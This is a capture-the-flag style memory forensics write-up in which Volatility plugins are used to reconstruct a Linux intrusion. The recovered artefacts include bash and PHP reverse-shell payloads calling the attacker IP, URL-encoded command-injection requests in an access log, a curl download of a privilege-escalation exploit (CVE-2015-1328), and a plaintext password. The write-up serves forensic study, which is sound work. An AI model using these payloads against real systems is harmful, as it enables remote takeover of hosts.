We setup volatility and get the available commands:

```
python vol.py --plugins=profiles/ --profile=LinuxUbuntu_3_13_0-32-genericx64 -f workdir/file.bin  --debug -h
```

1. What is the MAC address of the attacker machine?

```
python vol.py --plugins=profiles/ --profile=LinuxUbuntu_3_13_0-32-genericx64 -f workdir/file.bin  linux_arp
Volatility Foundation Volatility Framework 2.6.1
[ff02::1:ffcc:dde0                         ] at 33:33:ff:cc:dd:e0    on eth0
[ff02::2                                   ] at 33:33:00:00:00:02    on eth0
[ff02::16                                  ] at 33:33:00:00:00:16    on eth0
[192.168.1.1                               ] at 50:c7:bf:32:01:04    on eth0
[127.0.0.1                                 ] at 00:00:00:00:00:00    on lo
[192.168.1.194                             ] at 38:14:28:0b:12:de    on eth0
```

Should be the last one `38:14:28:0b:12:de`.

2. What is the full time of the moment when the attacker elevated his privileges to root?

```
2021-11-24 12:32:11 UTC+0000
```

Using this:

```
python vol.py --plugins=profiles/ --profile=LinuxUbuntu_3_13_0-32-genericx64 -f workdir/file.bin  linux_bash
Volatility Foundation Volatility Framework 2.6.1
Pid      Name                 Command Time                   Command
-------- -------------------- ------------------------------ -------
    1045 bash                 2021-11-24 12:20:13 UTC+0000   ip a s
    1045 bash                 2021-11-24 12:20:16 UTC+0000   ip link
    1045 bash                 2021-11-24 12:20:18 UTC+0000   arp -a
   18943 bash                 2021-11-24 12:25:09 UTC+0000   id
   18943 bash                 2021-11-24 12:25:11 UTC+0000   whoami
   18943 bash                 2021-11-24 12:25:20 UTC+0000   ls -al
   18943 bash                 2021-11-24 12:25:25 UTC+0000   cat .bash_history
   18943 bash                 2021-11-24 12:25:32 UTC+0000   history
   18943 bash                 2021-11-24 12:25:48 UTC+0000   ls
   18943 bash                 2021-11-24 12:25:48 UTC+0000   cd /dev/shm
   18943 bash                 2021-11-24 12:26:00 UTC+0000   ./linpeas.sh > linpeas2.out
   18943 bash                 2021-11-24 12:26:27 UTC+0000   cat linpeas2.out
   18943 bash                 2021-11-24 12:26:31 UTC+0000   cat linpeas2.out | grep passwd
   18943 bash                 2021-11-24 12:26:43 UTC+0000   cp /var/backups/passwd.bak /dev/shm
   18943 bash                 2021-11-24 12:26:44 UTC+0000   ls
   18943 bash                 2021-11-24 12:26:48 UTC+0000   cat passwd.bak
   18943 bash                 2021-11-24 12:27:02 UTC+0000   cat linpeas2.out
   18943 bash                 2021-11-24 12:27:39 UTC+0000   cat linpeas2.out | grep CVE
   18943 bash                 2021-11-24 12:31:20 UTC+0000   curl 192.168.1.194:8090/cve.c
   18943 bash                 2021-11-24 12:31:31 UTC+0000   curl 192.168.1.194:8090/cve.c -o cve.c
   18943 bash                 2021-11-24 12:32:11 UTC+0000   ./cve
    4504 bash                 2021-11-24 12:55:00 UTC+0000   cd /dev/shm
    4504 bash                 2021-11-24 12:55:01 UTC+0000   ls
    4504 bash                 2021-11-24 12:55:02 UTC+0000   ./cve
```

3. What is the MAC address of the affected machine? 

```
python vol.py --plugins=profiles/ --profile=LinuxUbuntu_3_13_0-32-genericx64 -f workdir/file.bin linux_ifconfig
Volatility Foundation Volatility Framework 2.6.1
Interface        IP Address           MAC Address        Promiscous Mode
---------------- -------------------- ------------------ ---------------
lo               127.0.0.1            00:00:00:00:00:00  False          
eth0             192.168.1.136        08:00:27:cc:dd:e0  True 
```

4. What is the PID of the application used by the attacker for his interactive shell? 

We get the PID `4503` using:

```
python vol.py --plugins=profiles/ --profile=LinuxUbuntu_3_13_0-32-genericx64 -f workdir/file.bin linux_pslist
```

5.  What PID does this recording mechanism have? 

It was the `tcpdump` with `4539`.

6.  The attacker might have set a recording mechanism on the network. Find out where is this recodring stored (absolute path).

Using the `linux_psaux` command we also dump the tcpdump arguments:

```
tcpdump -i eth0 -w /home/carl/capture.pcap
```

7. What is the PID of the root shell?

The pid was `4414`. Looking with `pslist` we identify the moment when the attacker get the root shell. And
using `pstree` we identify the pid looking on the hierarchy of processes.

```
.sshd                874                            
..sshd               18894                          
...sshd              18942           1000           
....bash             18943           1000           
.....sh              4414                           
......tcpdump        4539 
```

For the next 3 questions. We list tmpfs that can hide possible malicious activity:

```
python vol.py --plugins=profiles/ --profile=LinuxUbuntu_3_13_0-32-genericx64 -f workdir/file.bin linux_tmpfs -L
Volatility Foundation Volatility Framework 2.6.1
1 -> /sys/fs/cgroup
2 -> /run/lock
3 -> /run
4 -> /run/shm
5 -> /run/user
```

We dump `/run/shm` in our local folder `fsrec`:

```
python vol.py --plugins=profiles/ --profile=LinuxUbuntu_3_13_0-32-genericx64 -f workdir/file.bin linux_tmpfs -S 4 -D fsrec
```

In the file `password.bak` we find the password of `carl`.

```
messagebus:x:102:106::/var/run/dbus:/bin/false
landscape:x:103:109::/var/lib/landscape:/bin/false
carl:Thisiscarlsecurepassword:1000:1000:carl,,,:/home/carl:/bin/bash
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
```

8. What is the password of the unprivileged account?

Answer `Thisiscarlssecurepassword`

9. What is the CVE-ID of the exploit used to gain root access?

The answer was `CVE-2015-1328` this was found because of the `cve.c`. After we google a line
from it `system("rm -rf /tmp/ns_sploit /tmp/ofs-lib.c") cve` we find the actual exploit on `exploit-db.com`.

10. Provide the link of the exploit from exploit-db.com.

The link was `https://www.exploit-db.com/exploits/37292`.

11. What port was used on the attacker's local machine for the reverse shell? 

For this question we conduct a search with yara scan looking for the attacker's ip address in order to with a concatenation
with a port:

```
python vol.py --plugins=profiles/ --profile=LinuxUbuntu_3_13_0-32-genericx64 -f workdir/file.bin linux_yarascan -Y "192.168.1.194"
```

Then we look into the memory and there it is `12035`.

```
0x7fee52d84504  00 00 00 00 30 44 d8 52 ee 7f 00 00 3e 26 20 2f   ....0D.R....>&./
0x7fee52d84514  64 65 76 2f 74 63 70 2f 31 39 32 2e 31 36 38 2e   dev/tcp/192.168.
0x7fee52d84524  31 2e 31 39 34 2f 31 32 30 33 35 20 30 3e 26 31   1.194/12035.0>&1
0x7fee52d84534  00 00 00 00 31 00 00 00 00 00 00 00 41 00 00 00   ....1.......A...
```

12. What other payload did the attacker try, but was unsuccesful?

The payload was `bash -i >& /dev/tcp/192.168.1.194/12035 0>&1`.

From previous attempts we've seen that there was an apache2 server which means there should be a file where requests will be logged.
In this case the file was `access.log`:

```
python vol.py --plugins=profiles/ --profile=LinuxUbuntu_3_13_0-32-genericx64 -f workdir/file.bin linux_find_file -F "/var/log/apache2/access.log"
Volatility Foundation Volatility Framework 2.6.1
Inode Number                  Inode File Path
---------------- ------------------ ---------
         1444642 0xffff88007b9ae488 /var/log/apache2/access.log
```

And then we extract it:

```
python vol.py --plugins=profiles/ --profile=LinuxUbuntu_3_13_0-32-genericx64 -f workdir/file.bin linux_find_file -i 0xffff88007b9ae488 -O workdir/access.log
Volatility Foundation Volatility Framework 2.6.1
```

And jackpot:

```
cat workdir/access.log 
192.168.1.194 - - [24/Nov/2021:13:20:29 +0100] "GET / HTTP/1.1" 200 3594 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36"
192.168.1.194 - - [24/Nov/2021:13:20:46 +0100] "GET /?code HTTP/1.1" 200 3594 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36"
192.168.1.194 - - [24/Nov/2021:13:20:51 +0100] "GET /index.php HTTP/1.1" 200 223 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36"
192.168.1.194 - - [24/Nov/2021:13:20:55 +0100] "GET /index.php?code=1 HTTP/1.1" 200 224 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36"
192.168.1.194 - - [24/Nov/2021:13:20:58 +0100] "GET /index.php?code=%27 HTTP/1.1" 200 224 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36"
192.168.1.194 - - [24/Nov/2021:13:21:01 +0100] "GET /index.php?code=-- HTTP/1.1" 200 225 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36"
192.168.1.194 - - [24/Nov/2021:13:21:06 +0100] "GET /index.php?code=ls HTTP/1.1" 200 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36"
192.168.1.194 - - [24/Nov/2021:13:21:09 +0100] "GET /index.php?code=whoami HTTP/1.1" 200 247 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36"
192.168.1.194 - - [24/Nov/2021:13:21:13 +0100] "GET /index.php?code=id HTTP/1.1" 200 323 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36"
192.168.1.194 - - [24/Nov/2021:13:21:59 +0100] "GET /index.php?code=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.194%2F12035%200%3E%261 HTTP/1.1" 200 269 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36"
192.168.1.194 - - [24/Nov/2021:13:22:05 +0100] "GET /index.php?code=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.194%2F12035%200%3E%261 HTTP/1.1" 200 269 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36"
192.168.1.194 - - [24/Nov/2021:13:22:12 +0100] "GET /index.php?code=php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.1.194%22%2C12035%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27 HTTP/1.1" 200 366 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36"
```

We decode the 3rd line from the bottom.

13. What was the initial payload used by the attacker to create a reverse shell?

This was the last line from the access.log. Right now writting this I realise how dumb I was because I could get the port of the attacker from the apache's logs :').

The payload was `php -r '$sock=fsockopen("192.168.1.194",12035);exec("/bin/sh -i <&3 >&3 2>&3");'`.

14. What is the full time of the moment when the attacker established the first connection with the reverse shell?

We already got this from the apache's logs `24/Nov/2021:13:22:12 +0100`.

15. What is the address of the exploit used by the attacker?

Not found answer for this one

Kudos for [this](https://github.com/volatilityfoundation/volatility/wiki/Linux-Command-Reference) detailed command explanation. 
